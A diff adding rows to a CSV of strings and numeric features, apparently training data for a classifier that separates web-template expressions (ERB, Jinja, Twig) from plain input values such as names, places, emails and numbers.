+<%= t('LivePoll') %>,<%=t('S')%>,20,0.45,0,0,0,0,2,1,1,0,0,0,0,0,0,0,0,0
+8623,N,4,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+<%= t('Busy') %>,<%=t('S')%>,16,0.5625,0,0,0,0,2,1,1,0,0,0,0,0,0,0,0,0
+"<%= erb :_metrics_period_select, locals: { periods: @periods, period: @period, path: ""#{root_path}metrics"" } %>","<%=erb:_metrics_period_select,locals:{periods:@periods,period:@period,path:""S""}%>",111,0.234234,0,0,1,0,2,2,2,0,0,0,0,0,0,0,0,0
+"{{ form_start(form, {attr: attr|default({})}) }}","{{form_start(form,{attr:attr|default({})})}}",48,0.333333,1,0,0,0,0,1,6,0,0,0,0,0,0,0,0,0
+#{process['pid']},#{process['S']},17,0.411765,0,0,1,0,0,1,2,0,0,0,0,0,0,0,0,0
+46369,N,5,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+38428968q,Nq,9,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+#{process['hostname']},#{process['S']},22,0.318182,0,0,1,0,0,1,2,0,0,0,0,0,0,0,0,0
+61128609z,Nz,9,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+8o881si9le,NoNsiNle,10,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+curtis,curtis,6,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+menaker,menaker,7,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+<%= process.tag %>,<%=process.tag%>,18,0.333333,0,0,0,0,2,1,0,0,0,0,0,0,0,0,1,0
+{% extends 'base.html' %},{%extends'S'%},25,0.28,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0
+{{ _('Click to Reset It') }},{{_('S')}},28,0.321429,1,0,0,0,0,1,3,0,0,0,0,0,0,0,0,0
+{{ url_for('main.edit_profile') }},{{url_for('S')}},34,0.323529,1,0,0,0,0,1,3,0,0,0,1,0,0,0,1,0
+<%= t('Utilization') %>,<%=t('S')%>,23,0.391304,0,0,0,0,2,1,1,0,0,0,0,0,0,0,0,0
+{% elif not current_user.is_following(user) %},{%elifnotcurrent_user.is_following(user)%},46,0.195652,0,0,0,0,0,0,2,0,0,0,0,0,0,1,1,0
+11653982c,Nc,9,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+paleozoica,paleozoica,10,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+"av. benisa 43, 10d","av.benisaN,Nd",18,0.111111,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0
+2066,N,4,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+{{ form_end(form) }},{{form_end(form)}},20,0.35,1,0,0,0,0,1,3,0,0,0,0,0,0,0,0,0
+<%= t('StopPolling') %>,<%=t('S')%>,23,0.391304,0,0,0,0,2,1,1,0,0,0,0,0,0,0,0,0
+emil,emil,4,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+1814084012510251,N,16,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+<%= t('Threads') %>,<%=t('S')%>,19,0.473684,0,0,0,0,2,1,1,0,0,0,0,0,0,0,0,0
+ansa-sobrarbe,ansa-sobrarbe,13,0.076923,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+<%= relative_time(Time.at(process['started_at'])) %>,<%=relative_time(time.at(process['S']))%>,52,0.307692,0,0,0,0,2,1,3,0,0,0,0,0,0,1,1,0
+03812,N,5,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+8249,N,4,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+1784777474489263,N,16,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+sabinigo,sabinigo,8,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+telma,telma,5,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+05240,N,5,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+0488545604364372,N,16,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+37766,N,5,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+matizar,matizar,7,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+7406,N,4,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+95868852e,Ne,9,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+marciana,marciana,8,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+sylvia,sylvia,6,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+almazara,almazara,8,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+schiavelli@buscadordevideos.mk,schiavelli@buscadordevideos.mk,30,0.066667,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0
+jesusa,jesusa,6,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+cribada,cribada,7,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+buckner0,bucknerN,8,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+hayashi@librodeapuntes.tc,hayashi@librodeapuntes.tc,25,0.08,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0
+6653,N,4,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+technoso,technoso,8,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+thies,thies,5,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+20098056n,Nn,9,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+deshon7oso,deshonNoso,10,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+54,N,2,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+"<%= ""#{t('Queues')}: "" %>","<%=""S""%>",25,0.6,0,0,1,0,2,2,2,0,0,0,0,0,0,0,0,0
+91394289v,Nv,9,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+vall de ebo,valldeebo,11,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+isasi urquiza,isasiurquiza,13,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+419747iv6,NivN,9,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+colosse@velaconsultores.gob,colosse@velaconsultores.gob,27,0.074074,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0
+open3,openN,5,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+e2toc8da,eNtocNda,8,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+benzoico,benzoico,8,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+beneixama,beneixama,9,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+reese@housemovie.net,reese@housemovie.net,20,0.1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0
+"regimiento, 114,","regimiento,N,",16,0.125,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+66129193f,Nf,9,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+"pl. de monteleon 60,","pl.demonteleonN,",20,0.1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0
+berber,berber,6,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+${!visit['new']},${!visit['S']},16,0.5,0,1,0,0,0,1,2,0,0,0,0,0,0,0,0,0
+8962,N,4,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+kai-larsen-picchio6@multasdetransito.net,kai-larsen-picchioN@multasdetransito.net,40,0.1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0
+deborah,deborah,7,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+24443,N,5,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+virhuez prats,virhuezprats,13,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+tarpey@bwds.ne,tarpey@bwds.ne,14,0.142857,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0
+8787472125390389,N,16,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+baos vilarrasa,baosvilarrasa,14,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+lucila2,lucilaN,7,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+<%= format_memory(processes.total_rss) %>,<%=format_memory(processes.total_rss)%>,41,0.243902,0,0,0,0,2,1,1,0,0,0,0,0,0,0,1,0
+corua del conde,coruadelconde,15,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
